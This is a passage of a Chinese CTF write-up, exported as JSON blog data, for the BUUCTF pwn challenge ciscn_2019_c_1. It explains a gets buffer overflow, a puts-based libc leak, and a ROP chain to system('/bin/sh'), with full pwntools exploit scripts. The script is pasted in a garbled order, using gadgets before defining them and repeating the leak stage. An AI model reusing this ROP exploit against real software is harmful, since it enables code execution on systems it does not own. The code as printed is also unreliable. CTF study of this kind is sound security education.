class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"ct\\n\"</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"ciscn_2019_c_1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_c_1\">#</a> ciscn_2019_c_1</h2>\n<p>首先我们对程序进行检查，64 位程序且只开了栈不可执行，那么我们找到溢出点便可以进行溢出</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/9.png\"></center>\n<p>进入 IDA 进行分析，我们可以看到当用户选择 1 时会进入如下函数</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/10.png\"></center>\n<p>我们可以明显地看到溢出点便是这个 gets 函数，之后就是愉快的构造 rop 链的环节，我们首先去寻找可以输出的函数去通过泄露 libc，我们很快就可以看到一个 puts 函数，puts 函数需要一个参数，这个参数即 puts 的 got 表地址</p>\n<p>然后我们需要知道 64 程序的传参方式和 32 位的不大一样，所以我们需要找到控制传参的 gadget 片段，用 ROPgadget --binary ciscn_2019_c_1 搜索</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/11.png\"></center>\n<p>这便是我们需要的片段（因为我们需要传第一个参数到 rdi），泄露之后我们要返回到 main 函数进入下一步 getshell，在此之前我们要通过泄露出的 puts 函数的地址找到 libc 这里我们使用 LibcSearcher 这个库，之后找出 system 地址和 binsh 地址，但我们完成之后发现并不能行得通</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/12.png\"></center>\n<p>到这步为止我们正确地输出了 puts 函数的地址，也找出了 libc 库</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/13.png\"></center>\n<p>最后却提示了 timeout，这是怎么回事呢，这个时候我们可以通过 gdb.attach（p）来进行本地调试，但我选择了百度，发现是 Ubuntu 的栈对齐机制，我们需要再找一个 ret 来平衡栈，修改后成功 getshell</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher\n<span class=\"token keyword\">import</span> pwnlib\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\n\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">25704</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#p = process(\"./ciscn_2019_c_1\")</span>\n\n<span class=\"token comment\">#gdb.attach(p)</span>\n\nputs_plt <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004006E0</span>\nputs_got <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000602020</span>\nmain_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000400B28</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Ciphertext\\n'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nputs_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span> puts_addr<span class=\"token punctuation\">)</span>\nlibc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span>\nsys_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span>\n\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x58</span>  <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"your choice!\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"be encrypted\\n\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\npop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000400c83</span>\nret <span class=\"token operator\">=</span> <span class=\"token number\">0x4006b9</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x58</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"your choice!\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"be encrypted\\n\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Ciphertext\\n'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nputs_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span> puts_addr<span class=\"token punctuation\">)</span>\nlibc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span>\nsys_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span>\n\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x58</span>  <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"your choice!\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"be encrypted\\n\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>",
            "tags": [
                "PWN",
                "BUUCTF",
                "rop"
            ]
        }
    ]
}